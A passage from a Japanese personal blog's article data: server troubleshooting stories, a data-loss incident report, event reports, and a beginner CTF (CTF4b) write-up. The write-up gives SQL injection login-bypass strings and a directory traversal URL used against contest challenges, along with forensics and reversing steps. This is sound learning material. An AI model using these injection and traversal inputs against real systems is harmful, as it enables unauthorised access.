mem:16GB)で動かしました。\n\n全てのアプリはDockerで環境が分離されています。\n自作のソフトウェア（Dockerのラッパみたいな何か）によって、PaaSみたいな使い心地で問題を更新できる仕組みにしてました。\n\n👆のお陰で、出題ミスが見つかっても更新が非常にスムーズでした。\n最終的に100アカウントくらいが登録されてましたが、サーバも落ちたりせずに概ね順調でした。\n\nが、HTTPでのアクセスがクッッッッッソ遅い問題にぶち当たって険しい感じでした。\nなんか変な感じの挙動で、一度繋がるとそれ以後数10分は快適に繋がるが、\n繋がらない人は永遠につながらない（HTTPレスポンスが帰ってこない）感じ。\n\nで、サーバ全体の負荷も大したことなかったし、ネットワーク帯域も余裕っぽかったので、謎かった。\n\n## 重い理由\n\nサーバが1台で、アプリが沢山乗ってる構成なので、HTTPリクエストを捌いてくれるリバースプロキシとして**OpenResty**さんを使っていて、\nHTTPS化を手っ取り早くやるために[lua-resty-auto-ssl](https://github.com/GUI/lua-resty-auto-ssl)を採用していました。\n\nhttps://github.com/GUI/lua-resty-auto-ssl\n\n[lua-resty-auto-ssl](https://github.com/GUI/lua-resty-auto-ssl)は非常に優秀で、\n**正しく設定すれば**勝手にすべてのページをHTTPS化してくれて便利便利floatです。\n\nでまぁ、結論を言うと重いのはこの人が原因でした。\n\nこの人はOCSP Staplingもやってくれるんですが、コレを正しく動作させるためにはOpenRestyの`resolver`設定をしてあげないとダメです。\nどうダメかというと、遅くなります。おそらくDNSの問い合わせができずにそこでワーカーが止まってしまい永遠にレスポンスが帰ってこないのかな？\n\nエラーログにはOCSPが失敗したよ！っていうログがいっぱい出ていなので、コレが問題なのは間違いないんですが詳しい原因はコレ以上分からずです。\n一旦繋がると以後は素早く繋がるのは多分、一度OCSPで証明書の正当性が確認されるとしばらくは確認しないから……？\nでもOCSP Staplingってサーバ側が能動的に送ってるものな気がするし違うのでしょうか……\n\nそれと、[lua-resty-auto-ssl](https://github.com/GUI/lua-resty-auto-ssl)が内部で使ってるLetsencryptクライアントの\n[dehydrated](https://github.com/lukas2511/dehydrated)は、デフォルトだとRSA **4096bit**の証明書を作成します。\n4096bitは結構遅いです。適当に`ab`で計測したら4096bitは2048bitを比較してリクエスト完了まで10倍くらいの時間がかかってました。\n\n## Dockerの内部DNS\n\nさっきのOpenRestyはDockerコンテナ内で動かしてたんですが、\nDocker内部だとデフォルトゲートウェイがDockerネットワーク内でのホストのアドレスなので、\nDNSのについてもこの人がやってくれてるんだろうな〜〜って勝手に思って勝手にそう指定してたんですが、これが間違いでした。\n\nDockerネットワーク内でのDNSサーバは、`127.0.0.11`が正しいそうです。\nというか、resolve.confを見たらちゃんと書いてあったわ……\n\n## おわり\n\nわからないことが多いです。\n誰か鉞投げて欲しい。\n","title":"新入生向けCTF体験会のスコアサーバが重かった","image":null,"tags":["日記","インフラ","ネットワーク","DNS","Docker","CTF"],"date":"2017-05-17T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"16","body":"GitLabのマネをしました。\n\n作業していたら突然サーバが爆発しました。怖いです。\n\nええと、何があったのかというと、ミスって**Webアプリのデータの大部分を吹き飛ばして**しまいました。\n個人鯖じゃなくて、大学サークルの部内システムが全部乗っかってるサーバなのでやばばばいです。\n\n# 原因\n\n![](1.png)\n\nこれです。Win機ではいつもrloginというsshクライアントを使って作業しているんですが、\nこのクライアントには**コマンドを複数のサーバに同時送信する機能**が搭載されています。\n\nボクはこの事を知らなかったんですが、クリックミスでいつの間にか有効化してしまっていたんですね。\n\nで、このときボクは来る新入生歓迎CTF大会の鯖を構築していました。\n設定ファイルをコピーするために、**メインサーバにもSSHログイン**した状態でした。\n鯖構築序盤なので、いろいろ試行錯誤しつつ`rm -rf`なんかも連打してたんですね……\n\n本鯖にも`rm -rf`が飛んでることなど露知らず……！\nメインサーバ落ちてるよ～って連絡を受けて確認したらすっかりCTFサーバと化したメインアプリサーバが……。\n\n# 被害\n\nバックアップ等から復元して、ほとんどのアプリは事なきを得たのですが、部内SNS(内製)だけが致命的な打撃を被りました。\n\n一番被害が大きかったのがアップロードされたファイル群です。これらが一時全て削除されてしまいました。\nこれらは、非常に大容量なので別の場所にバックアップするのが億劫になって放ったらかしになっていたのでした……\n\nまた、重要な設定ファイルが損失してこちらの復旧も非常に大変でした。\n\n# 対応\n\n4/16夜から4/17早朝にかけてのお話です\n\n## 19:40 CTF鯖が起動\n\nサーバ構築を始めました。この時点でコマンドブロードキャストが有効になっています。\n（そういえばカーソルが変な形になってて妙だな……と思っていたのでした。。。）\n\n## 20:00 メインサーバに致命的なコマンドが飛ぶ\n\nちょっとやり直そうと思って`rm -rf`で色んな所消しました。\nメインサーバの大事なトコロにも直撃してます。\n\n## 20:10 メインサーバの死が報告され始める\n\nhttps://twitter.com/NorthWest_Bread/status/853568096845430784\n\nこの時点では何が起きたのか分かってません。\n\n## 20:30 全てを悟る\n\nさっきまで弄っていたCTF鯖とメイン鯖の`.bash_history`が一致しているのを見て何が起きたのか気が付きました。\n（なるほどね）（時既に遅し）（やばい）\n\n## 20:40 メインサーバを止める\n\n復元することを考えて、ディスクに上から書き込まれてしまわないようにサーバを止めました。\n`ddrescue`でディスクをダンプしておきました。\n\n## 20:50 いろいろ試してみる\n\nextundeleteとかを試してみますが、歯が立たず。\n\n## 21:00 データが無事なアプリを別サーバに移す\n\nとりあえず、ディスクをダンプしたデータから無事なアプリを復旧する作業に移る。\n新しくサーバを立て直します。\n\n## 22:00 gitホスティングサービスが復旧\n\nメンテナンス用コードなんかも入っているので真っ先に復旧させました。\n\n## 22:30 ブログが復旧\n\nブログにアップロードされたデータは全てオブジェクトストレージに逃がしていたので、無傷でした。\n\n## 22:50 wikiが復旧\n\nwikiも同じく、データの大部分がオブジェクトストレージにあるため無事。\n\n## 23:00 photorec/foremostでファイルを救出する作戦に出る\n\nextundeleteが不発だったので、👆を使ってファイルを抜き出します。\nただし、ファイル名がわからなくなってしまうのでDBとの整合性を取る作業が非常に大変になりそうだなぁとか思ってました。\nそもそも、アップロードされたファイルの情報は元のファイル名とサイズとタイムスタンプ、MIMEタイプしかありません。\nこのなかで使えるのはMIMEタイプとファイルサイズのみです。\n\n## 00:30 DBマイグレーション時の対応表を発見\n\n昔にDBスキーマを変更したときのバックアップデータを見つけました。\nこのデータを使うことで、約30%のデータが完全復旧できました。\n\n## 02:30 復元スクリプトが完成\n\nphotorec/foremostを併用してデータ復元作業を行います。\n\n## 03:10 復元完了\n\nおよそ 75% データが復元できました。\n13% のデータは、破損していて元に戻せませんでした。\n残りの 12% は、データはおそらく拾い出せているが、同じサイズやMIMEタイプのデータが複数存在するため、元のファイルがどれかわからない状態です。\nこちらについては、人力で対応表を作ればもとに戻せる可能性はあります。\n\n## 03:20 部内SNS復旧作業\n\nこちらもなかなか難航しました。\nなくなってしまったファイルの扱いについて、アプリの改修を行う必要がありました。\n\n部内のシステムは全て独自方式SSOで接続されており、ここでは公開鍵暗号を使って認証を行っています。\nここで用いていた権威サーバの秘密鍵が失われたので、アプリ側に配布している公開鍵を全て更新する作業が必要になりました。\n\nまた、APNsやGCMの通知に使うキーも失われたので再発行を行いました。\n\n## 05:00 再開\n\n全て元に戻りました。\n25%くらいのデータが欠けてしまいましたが……。\n\n# まとめ\n\n## 対策\n\n- バックアップは取る\n- むやみにrootにならない\n\t- いちいちsudoうつの面倒だったんだもん＞＜\n\n## extundelete\n\n無能\n（ext4だったからね）\n\n## photorecとforemost\n\nphotorecで戻せたけどforemostで戻らないファイルとか、その逆もある。\n両方合わせて使うと良いかもしれない。あとCTFer御用達の`binwalk`でも似たようなことができるのかな？\n\n## 感想\n\n同時送信怖すぎる……\nというかもっとわかりやすく表示してくれ\n\nお陰でCTFの準備が一ミリも進んでなくてマズい\nというかリアルにフォレンジックすることになるとは思わんかった\n\n教訓にします\n\nゴメンナサイm(_ _)m\n\n![](2.jpg)\n","title":"鯖が爆発した","image":null,"tags":["日記","インフラ"],"date":"2017-04-17T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"external","url":"https://trap.jp/post/200/","publisher":"東京工業大学デジタル創作同好会traP","title":"VolgaCTF 2017 Quals に出た話【新歓ブログリレー2017 11日目】","tags":["traP","CTF","参加記"],"date":"2017-04-07T00:00:00.000Z"},{"type":"external","url":"https://trap.jp/post/167/","publisher":"東京工業大学デジタル創作同好会traP","title":"サイバーコロッセオ×SECCON 2016に出ました","tags":["traP","CTF","参加記"],"date":"2017-03-07T00:00:00.000Z"},{"type":"article","slug":"15","body":"行きました\n\n株式会社mixiさんがやってる神イベント**第5回git challenge**に行ってきました。\n\n## git challenge\n\ngitで与えられた課題を解決していく競技(?)イベント\n要は与えられたリポジトリを指定された状態に持っていけばよし\n\nmixiさんの説明を見たほうが早い\n\nhttps://github.com/mixi-git-challenge/publications\n\n## 参加\n\n第4回にも応募したんですけど落ちました。\n**ES出してなかったからね。**\n\nちなみに[同じ大学の友人が第4回に行ってる](https://trap.jp/post/100/)よ。\n\nhttps://trap.jp/post/100/\n\n今回は無事(?)通りました。\n同大の人がけっこう応募してたのを見たけど、ことごとく落ちてたのでけっこう人気そう。\n\n![](1.jpg)\n\n## 流れ\n\n午前：簡単なチュートリアル\nお昼：ご飯\n\nhttps://twitter.com/sekai67/status/825296559260643328\n\n午後：競技\n夕方：懇親会\n\n## 競技\n\n2人1組です。\nあらかじめチームが組まれているので安心ですね。\n\nボクのチームメイトは中国からの留学生で、Swiftのプロ👏でした。\nでもgitは1人でしか使ったこと無いのでつらいよ＞＜らしいです。\n\nということで★１をお願いして、ボクは★２↑をやりました。\n途中チームメイトがつらいつらい＞＜してたので教えてあげながら一緒に解いてました。\n\n問題の内容を書くと多分怒られるので、ざっくりと感想を書くと、\n- gitの基礎はわかっていないと死ぬ\n- 発展的な機能を使いこなす系問題が主\n- めっちゃ勉強になる\n- ★5↑は悪ノリ\n- たのしい\n\n★5↑、未だに解かれてないらしいです。\nボクも頑張ったんですが、あと僅かのところでタイムアップ。残念。\n\n## 結果\n\n![](2.jpg)\n\nbravoです。\n\nhttps://twitter.com/N4RU5E/status/825262132514000898\n\n景品です。うれしい。\n\n## 懇親会\n\n🍺とか振る舞われます。\nプレモルはアド\n\nhttps://twitter.com/N4RU5E/status/825287811649507329\n\nなんか[セキュリテイ・キャンプ](/posts/9/)で見た顔ぶれだ……！\nってなりました。\n\nセキュキャン勢はこういうイベントで良く会う。\n何処にでも出没するな……\n\n## おわり\n\nたのしい！ためになる！\n\nmixi「イベントにmixi色がない」\nボク「それな」\n\nmixiさん！！！！\n[Scrap Challenge](https://www.google.co.jp/search?q=mixi+Scrap+Challenge)復活してください！！！！！\n","title":"第5回git challengeに行った","image":null,"tags":["参加記","git","mixi","git challenge"],"date":"2017-01-28T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"external","url":"https://trap.jp/post/158/","publisher":"東京工業大学デジタル創作同好会traP","title":"署名付きクッキー / Omniauth Strategyを書く / GitLabで独自認証","tags":["traP","アドベントカレンダー","認証","セキュリティ"],"date":"2016-12-25T00:00:00.000Z"},{"type":"article","slug":"14","body":"作りました\n\n[ConoHa Advent Calendar 2016](http://qiita.com/advent-calendar/2016/conoha) 24日目の記事です。\n\n[ConoHa Advent Calendar 2016](http://qiita.com/advent-calendar/2016/conoha)\n\n# ConoHaのDNS\n\n[ConoHa](https://www.conoha.jp/referral/?token=sp928CCbwhPZeu0SLEbeVyIhGOsIchLSzaun2yUbKWaR.q89860-OPA)には無料で使えるDNS機能が用意されています。\nなぜか[機能一覧](https://www.conoha.jp/function/)には乗ってません。見落としてるだけだろうか。GeoDNSは書いてある。\n[料金](https://www.conoha.jp/pricing/)ページには**「ドメインのレコードを登録して使うことができるDNS機能を無料提供。」**って書いてありますね。\n\n# 使ってみる\n\n登録がまだの人は急いで登録しましょう。\n[ココ](https://www.conoha.jp/referral/?token=sp928CCbwhPZeu0SLEbeVyIhGOsIchLSzaun2yUbKWaR.q89860-OPA)から登録するとクーポンもらえますよ。\n**電話認証**を選択するのを忘れずに。\n\nとりあえず、ConoHaにログインしたらまず右上のメールアドレスをクリックしてメニューを開き、「アカウント設定 > 表示設定 > モード設定」で**”このはモード”**を選択します。\n\n![](1.png)\nあぁ＾〜\n\n左のメニューから「DNS」を開けば、こんなカンジでDNSが使えます。\n\n![](2.png)\n\nもちろん、ドメインのレジストラの方でネームサーバをConoHaの`ns-a*.conoha.io`にしないとダメですよ。\n\nそれだけ。\n\n# DNS API\n\nコレだけだとまぁわざわざConoHaのDNSを使わなくてもレジストラ標準のDNSでいいじゃん！ってなるんですが、\nConoHaのDNSの強みは**APIから設定を操作できる**点にあります。\n\nCLIクライアントの[python-designateclient](http://docs.openstack.org/developer/python-designateclient/)があるのでそれを使いましょう。\n\n……だと終わってしまうので、自分が使いやすいように作った[conoha-dns](https://github.com/kaz/conoha-dns)を紹介します。\n\n# conoha-dns\n\nnodejsからDNS APIを叩くために書いたコードの副産物的に作りました。\n\nObjectStorageのCLIクライアント[conoha-ojs](https://github.com/hironobu-s/conoha-ojs)をリスペクトして\n- 認証情報をファイルに保存\n- シングルバイナリで動作\nするようになってます。\n\nAdC用に急ぎで作ったのでだいぶ作りが荒いです。\n問題が起きても責任は取れませんが、よかったら使ってください。\n\n[conoha-dns](https://github.com/kaz/conoha-dns)\n\n## 動作風景\n\nこういうかんじです。\n詳しい説明は[conoha-dns](https://github.com/kaz/conoha-dns)を見てね。\n\n```\n$ conoha-dns auth\nTenant ID: mytenantid\nAPI User: myusername\nPassword:\nOK\n\n$ conoha-dns add wataraijun.com\nid                                    name             ttl\n------------------------------------  ---------------  ----\nc8f8677e-742c-4ed6-9a53-de80d76571aa  wataraijun.com.  3600\n\n$ conoha-dns add www.wataraijun.com -t CNAME -d www.narusejun.com\nid                                    name                 type   ttl   data                priority\n------------------------------------  -------------------  -----  ----  ------------------  --------\nbb02410c-2761-4080-9b70-da7445fc714c  www.wataraijun.com.  CNAME  3600  www.narusejun.com.  null\n```\n\n## 感想\n\n- 見通しを立ててコード書くの難しい\n   - あとからいろいろ変えたらわけわからん設計になった\n- 同じコマンドで別のAPIを叩いてるのが気持ち悪いかもしれない\n   - python-swiftclientやconoha-ojsみたいに、`list`単体だとコンテナを一覧表示、`list hoge`だとコンテナの中身を一覧表示……みたいなイメージだったんだけど\n- Goはシングルバイナリで配布できる！とか持て囃されてるけどnodejsでもできるから！\n   - [nexe](https://github.com/nexe/nexe)というものを使います\n   - 一部動かないコードがあったり、nodeをまるごとコンパイルするのでクソ時間かかったりしますが……\n   - nodejs最高\n- ConoHaちゃんかわいい\n\n# 以上\n\nこのはちゃんが可愛すぎることを差し置いてもConoHaはめっちゃ良いサービスです。\nConoHa最高。\n\nサークルのブログにもConoHa関係の記事があります。\n[ConoHaでArchLinuxを動かすまで](https://trap.jp/post/39/)\n\n# 宣伝\n\n今年の冬コミ(C91)に技術系の合同誌を出します。\n\nトピックは\n- SQLインジェクション ([@N4RU5E](https://twitter.com/N4RU5E))\n- シェーダー(GLSL) ([@sobaya007](https://twitter.com/sobaya007))\n- 巡回セールスマン問題 ([@_n_ari](https://twitter.com/_n_ari))\n- LLVM ([@long_long_float](https://twitter.com/long_long_float))\n- ディープラーニング ([@to_huothu](https://twitter.com/to_huothu))\n\nの5つで200ページとなっております。\n角で殴られたら致命傷なカンジな厚さになってます。\n1000円です。\n\n**木曜日(1日目) 西地区“み”ブロック－18b**\n**「揚羽高校情報処理部」**\n\nでお待ちしています。よろしくお願いします！\n\n## 目次\n\n![](book1.png)\n![](book2.png)\n![](book3.png)\n","title":"ConoHaのDNS APIをCLIから叩くやつを作った","image":null,"tags":["アドベントカレンダー","ConoHa","DNS"],"date":"2016-12-24T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"13","body":"行きました\n\n東京から参りました成瀬順と申します。\n\nCTF4b東京は大人気だったらしく行けなかったので、金沢へ参加しました。\n\n# Web\n\n- ChromeのDevToolsの使い方\n- ディレクトリトラバーサル\n- SQLインジェクション\n- XSS(の紹介だけ)\n\n演習中心で、実際にやってみよう！って感じなので楽しくて分かりやすかったです。\n\nあとディレクトリトラバーサルとかSQLインジェクションの演習になんか隠しFLAGみたいなものが置いてあって、\n†ビギナー†の人も楽しめそうでした。\n\nSQLiの方の隠しFLAGは見つけられました\n`web4b{can_access_another_table}`\n\n# Forensics\n\n- Forensicsとは\n- ネットワークについて\n- ツールの使い方\n  - Wireshark\n  - binwalk\n  - exiftool\n  - The Sleuth Kit\n\nForensicsは全く知識がなかったので色々勉強になりました。\nWiresharkの便利な機能をたくさん知れたので強くなった気がします💪\n\n# Reversing\n\n- プログラム実行の仕組み\n- x86アセンブリ入門\n\nちょうど大学でx86を勉強したところだったので、なんとかついていけました。\n**上達のコツ**はたくさん読むことだそうです（がんばります＞＜）\n\n# CTF\n\n講義で学んだことを活かしてみよう！というやつです。\n\nがんばって全部解きました！\n\n![](1.png)\n\nhttps://twitter.com/ctf4b/status/802446106776850432\n\nFLAGためて10分前にまとめて出してみました。\nいわゆるサブマリン戦法です。（一度やってみたかったんです＞＜）\n\n以下Writeup\n\n\n## Warmup (Misc 10)\n\nやるだけ\n\n## てけいさん for ビギナーズ (Misc 200)\n\nめっちゃ簡単な計算問題が100問出されるので全部解いてねって問題でした。\n与えられたURLにアクセスすると計算式が書いてあって、その下にあるフォームに値を入力してSubmitするようになってます。\nたぶんPHPのSESSIONで何問解いたかをカウントしてるので、ここはどうにもできなさそうです。\n\n最初ふつうに100問解こうかなと思ったんだけど間違えたらリセットされるみたいなのでやめました。\n\nJavaScriptを書いて(Web講義で習ったDevToolsを使って)100回走らせました。\n\n```javascript\ndocument.querySelector(\"input[type=text]\").value = eval(document.querySelector(\"div\").textContent);\ndocument.querySelector(\"input[type=submit]\").click();\n```\n\n模範解答はPython(?)でやってたけどスクレイピングして……とかが面倒そうでした。\n\n## CountUp Game (Misc 200)\n\n> 交互にカウントアップしていこう ただし，21を言ってはいけません\n\nコンピュータと交互に1〜3づつ値を増やしていって、21を踏んだら負けるゲームを10連勝してねって問題でした。\nなんか競プロでありそうな問題ですね。\n\nそんなに難しくなくて、自分が必ず後攻なので、自分が必ず4の倍数を踏むようにしていれば勝てます。\nたった10勝でOKなので、手でやりました。\n\n## Fix it (Web 100)\n\n> ページ遷移を行うプログラムを書いたが何かを間違っているらしく正常に動作しないそうだ。何がおかしいのか調べてほしい。\n\n講義でやったやつだ！\n\n送られてくるヘッダをよく見てみると、\n`Locatin: /web100/flag_is_here.php`\nTypoしてます。\n\nということで、このURLにに行くとFlagが落ちてました。\n\n## Login as Admin (Web 200)\n\nこれも講義でやったやつだ！\n\nSQLインジェクションっぽいですね。\nので、\n```\nusername: admin\npassword: ' OR 1 --\n```\nとかしてみたらイケました。\n\n## 1M4G3 V13W3R (Web 200)\n\n画像アップローダです。\nアップされた画像を開いてみると、URLが`/web200-2/view.php?file=f5b5a9b812d45f55.jpg`とかで、怪しい。\n\n講義でやったディレクトリトラバーサルかな！？\n\nじゃあ`/web200-2/view.php?file=../index.php`とかすると、\nPHPコメントでFlagが書いてありました。\n\n## Login Lv2 (Web 300)\n\nまたログインフォームです。\n普通にSQLインジェクションを試行するんですが、どうも上手く行かないようです。\n（でもエラーにはなります。うーん？）\n\n適当にログインを試行していると、「ユーザー名かパスワードが間違っています。」と怒られるんですけど、\nこのときのURLが`/web300/index.php?error=invalid_user.txt`とかなってて、アレかなってなりました。\n\nということで、POSTリクエストの宛先である`/web300/index.php?error=login.php`を見てみると、\n```php\n$sql = \"SELECT username, password FROM users WHERE username = ('{$username}') AND password = ('{$password}');\";\n```\n\nカッコで囲んでいたんですね！\nじゃあこうすれば……\n```\nusername: admin\npassword: ') OR 1 --\n```\nイケました。\n\n## FileSystem (Forensics 100)\n\n謎のファイルが渡されます。\n（なんのファイルかは問題名から察せそうですけど、）とりあえず講義で学んだように、どんなファイルであるかを調べてみます。\n\n```sh\n# file for100\nfor100: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID \"mkfs.fat\", sectors/cluster 4, root entries 512, sectors 8192 (volumes <=32 MB) , Media descriptor 0xf8, sectors/FAT 6, sectors/track 32, heads 64, serial number 0x742adb6b, unlabeled, FAT (12 bit)\n```\n\nFATですね。\nではでは、講義で習ったThe Sleuth Kitを使ってみます。\n\n```sh\n# fls for100\nr/r 4:   flag.txt\nr/r * 6: .flag.txt.swp\nv/v 130867: $MBR\nv/v 130868: $FAT1\nv/v 130869: $FAT2\nd/d 130870: $OrphanFiles\n```\n\nありますね！\n\n```sh\n# icat for100 4\nctf4b{\n```\n\n消えてる……\n\nここで削除済みの`.flag.txt.swp`に注目します。\nこのファイルはvimが編集履歴を保持しておくファイルで、通常はファイルが保存されたらこのswpは削除されます。\n\nでもこのイメージにはバッチリ(削除済みファイルとして)残ってるので、\n\n```sh\n# icat for100 6\nU3210#\"! Utpad????ctf4b{ff97e486da08bfec774688ca3ef6ac42}\n```\n\n### ラクをする\n\n問題名から察するに、講義で紹介したThe Sleuth Kitを使ってなんかしてね！って問題なんだろうなって思ったんですけど、\nstringsでゴリ押してしまいました＞＜\n\n```sh\nstrings for100 | grep ctf4b{\n```\n\n## みてみよう (Forensics 200)\n\npcapファイルが渡されます。\n\nそんなにリクエスト数が多くなくて、PNGをダウンロードしてるHTTP通信が１つだけです。\n授業で習ったように、ファイル＞オブジェクトをエクスポートでこのPNGをファイルを取り出してみます。\n\nそうするとただの真っ白な画像ファイルでした。（困った……）\nここで、講義で習ったbinwalkを使ってみます。\n\n```sh\n# binwalk flag.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 320 x 240, 8-bit/color RGB, non-interlaced\n41            0x29            Zlib compressed data, best compression\n744           0x2E8           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#'>\n```\n\nなんかRDFのデータがくっついてますね。\nじゃあ、講義で習ったexiftoolを使ってみます。\n\n```sh\n# exiftool flag.png\nExifTool Version Number         : 10.20\nFile Name                       : flag.png\nDirectory                       : ..\nFile Size                       : 1010 bytes\nFile Modification Date/Time     : 2016:11:27 03:02:03+00:00\nFile Access Date/Time           : 2016:11:27 03:06:03+00:00\nFile Inode Change Date/Time     : 2016:11:27 03:02:33+00:00\nFile Permissions                : rwxrwx---\nFile Type                       : PNG\nFile Type Extension             : png\nMIME Type                       : image/png\nImage Width                     : 320\nImage Height                    : 240\nBit Depth                       : 8\nColor Type                      : RGB\nCompression                     : Deflate/Inflate\nFilter                          : Adaptive\nInterlace                       : Noninterlaced\nXMP Toolkit                     : Image::ExifTool 9.74\nKeywords                        : ctf4b{f970e2767d0cfe75876ea857f92e319b}\nImage Size                      : 320x240\nMegapixels                      : 0.077\n```\n\n見えました！\n\n### ラクをする\n\nたぶん講義で紹介したWiresharkを使ってFlag探してね！って問題なんだろうなって思ったんですけど、\nstringsでゴリ押してしまいました＞＜\n\n```sh\nstrings for200 | grep ctf4b{\n```\n\n## ICMP？ (Forensics 200)\n\npcapファイルが渡されます。\n\nWiresharkで普通に開くと、pingのrequestとreplyだけが記録されています。\n眺めていると、1つだけサイズが大きい通信があります。（統計＞パケット長を見ても良かったかも。）\n\nで、このパケットを見ると、pingのDataに何故かHTTPレスポンスがのっています。\n\n```\nY'VERM]@@ {T HTTP/1.1 200 OK\nDate: Thu, 14 Jul 2016 14:28:30 GMT\nServer: Apache/2.4.20 (Debian)\nLast-Modified: Thu, 14 Jul 2016 14:21:21 GMT\nETag: \"35-537993754cce4\"\nAccept-Ranges: bytes\nContent-Length: 53\nContent-Type: text/plain\n\nY3RmNGJ7NTM2ZGFjMzcxYWE2NTJmODY1YzIwYWJlN2I0MDk0ZGJ9\nn\n```\n\nこの文字列、講義で習ったbase64っぽくないですか？\nということでデコードしてみます。\n\n```sh\n# echo Y3RmNGJ7NTM2ZGFjMzcxYWE2NTJmODY1YzIwYWJlN2I0MDk0ZGJ9 | base64 -d\nctf4b{536dac371aa652f865c20abe7b4094db}\n```\n\n### ラクをする\n\nまぁとりあえずstringsします！！！\n\n```sh\nstrings for200-2\n```\n\nそしたらbase64っぽい文字列が見えてしまったのでデコードしたらFLAGでした。\n（なんかbase64ってなんとなくわかりますよね）\n\n## adminでログインしろ！ (Forensics 300)\n\npcapとサービスのURLが渡されます。\n\nとりあえずSQLインジェクションとか試して見るんですけど、(まぁForensicsだし)ダメでした。\nで、よく見るとパスワードリセットができるようになっています。\nが、リセットしようとするとメールアドレスと郵便番号を入力しろと言われます。\n\nということで、サービス管理者の通信を盗聴したっぽいpcapを見に行きます。\nとりあえず脳死stringsしましたが成果がなかったので、Wiresharkを使って講義で習ったヤツをやってみました。\n\nWiresharkの統計＞プロトコル階層を見てみたところ、\nなんか大量の通信の中にちょっとだけSMTP(メール送信)の通信が記録されていました。\n（少ないやつは怪しいって講義で習いました。）\n\nで、この通信を覗いてみる(講義で習ったFollow TCP Stream)と、\nどうやら管理者と思しきアドレスから、画像つきで「引っ越しました！」みたいなメールを送っていました。\n\n```\n220 4a256f335dbb Python SMTP proxy version 0.2\nehlo debian.debian\n502 Error: command \"EHLO\" not implemented\nhelo debian.debian\n250 4a256f335dbb\nmail FROM:<admin@poe.ctf4b>\n250 Ok\nrcpt TO:<john@poe.ctf4b>\n250 Ok\ndata\n354 End data with <CR><LF>.<CR><LF>\nContent-Type: multipart/mixed; boundary=\"===============1980392290290904787==\"\nMIME-Version: 1.0\nTo: john@poe.ctf4b\nFrom: admin@poe.ctf4b\nSubject: 引越しました\n\n--===============1980392290290904787==\nContent-Type: text/plain; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 8bit\n\n\n会津若松に引越しました.\nお近くにお越しの節はどうぞお気軽にお立ち寄り下さい.\n\n新居から見える景色を画像で添付します.\n\n\n--===============1980392290290904787==\nContent-Type: image/jpeg\nMIME-Version: 1.0\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename=\"./keshiki.jpg\"\n\n<<<略>>>\n--===============1980392290290904787==--\n.\n250 Ok\nquit\n221 Bye\n```\n\nとりあえずこれで管理者のメールアドレス`admin@poe.ctf4b`は手に入ったので、次はメールに添付されている画像です。\n画像はbase64化されてメールにくっついているので、デコードしてみるんですが、見ても写っているのが何処かなんてピンと来ません。\n\nじゃあ、ということで講義で紹介されたexiftoolでEXIFを見ると……\n撮影した位置情報(GPS Position)がバッチリ残っていました。\n\n```sh\n# exiftool -GPSPosition keshiki.jpg\nGPS Position                    : 37 deg 29' 54.83\" N, 139 deg 56' 9.00\" E\n```\n\nこのGPS座標をGoogleMapとかに入れれば大体の場所がわかるので、あとは適当にググって郵便番号を割り出します。\nで、この2つの情報でパスワードリセットすればログインしてFlagが見れます。\n\n## Welcome Reversing World! (Reversing 100)\n\n実行すると`Enjoy CTF!`って出てきて終わります。\n\nバイナリがいきなりstrippedで読むのが辛い＞＜\n頑張って読むと、`Enjoy CTF!`を表示するちょっと手前に、なんか怪しいことをしてます。\n\n```x86asm\n 804841c:   c7 45 f0 00 00 00 00    mov    DWORD PTR [ebp-0x10],0x0\n 8048423:   c7 45 f4 e0 84 04 08    mov    DWORD PTR [ebp-0xc],0x80484e0\n 804842a:   83 7d f0 00             cmp    DWORD PTR [ebp-0x10],0x0\n 804842e:   74 10                   je     8048440 <__libc_start_main@plt+0x150>\n 8048430:   83 ec 0c                sub    esp,0xc\n 8048433:   ff 75 f4                push   DWORD PTR [ebp-0xc]\n 8048436:   e8 a5 fe ff ff          call   80482e0 <puts@plt>\n```\n\nC言語っぽく書けば\n```c\nint num = 0;\nchar* flag = 0x80484e0;\nif(num != 0){\n   puts(flag);\n}\n```\n\nみたいなカンジですね。\nまぁどう考えてもif文の中が実行されるワケがないですね。\nでもアドレスがわかるので、ココを見れば表示されるはずの文字列がわかります。\n\n`0x80484e0`は.rodataセクションの中なので、\n\n```sh\n# objdump -s -j.rodata bin100\n\nbin100:     file format elf32-i386\n\nContents of section .rodata:\n 80484d8 03000000 01000200 63746634 627b3537  ........ctf4b{57\n 80484e8 72316e36 355f6330 6d6d346e 645f6631  r1n65_c0mm4nd_f1\n 80484f8 6e645f66 6c34367d 00456e6a 6f792043  nd_fl46}.Enjoy C\n 8048508 54462100                             TF!.\n```\n\nありました。\n\n### ラクをする\n\n脳死stringsで見つかってしまった\n```sh\nstrings bin100\n```\n\n作問者さんによる解説でもstringsが想定解って言ってました(?)\n\n## Lecture Review (Reversing 200)\n\n与えられたバイナリの指定された部分(nopで囲まれたところ)を抜けると`%eax`の値はいくつになっているか？\n講義の演習でやった計算をやってみよう！ってやつですね。\n\nがんばって読んで計算するだけです。\n\n### ラクをする\n\ngdbを使うとちょっとラクできます。\n\n```sh\n# gdb -q ./bin200_1\nReading symbols from ./bin200_1...(no debugging symbols found)...done.\n(gdb) disas main\nDump of assembler code for function main:\n   0x08048416 <+0>:  push   ebp\n   0x08048417 <+1>:  mov    ebp,esp\n   0x08048419 <+3>:  sub    esp,0x10\n   0x0804841c <+6>:  nop\n   0x0804841d <+7>:  nop\n   0x0804841e <+8>:  mov    DWORD PTR [ebp-0xc],0x14\n   0x08048425 <+15>: mov    DWORD PTR [ebp-0x8],0x8\n   0x0804842c <+22>: mov    DWORD PTR [ebp-0x4],0xfffffffd\n   0x08048433 <+29>: push   DWORD PTR [ebp-0x4]\n   0x08048436 <+32>: push   DWORD PTR [ebp-0x8]\n   0x08048439 <+35>: push   DWORD PTR [ebp-0xc]\n   0x0804843c <+38>: call   0x80483db <calc>\n   0x08048441 <+43>: add    esp,0xc\n   0x08048444 <+46>: mov    ds:0x804a01c,eax\n   0x08048449 <+51>: mov    eax,ds:0x804a01c\n   0x0804844e <+56>: nop\n   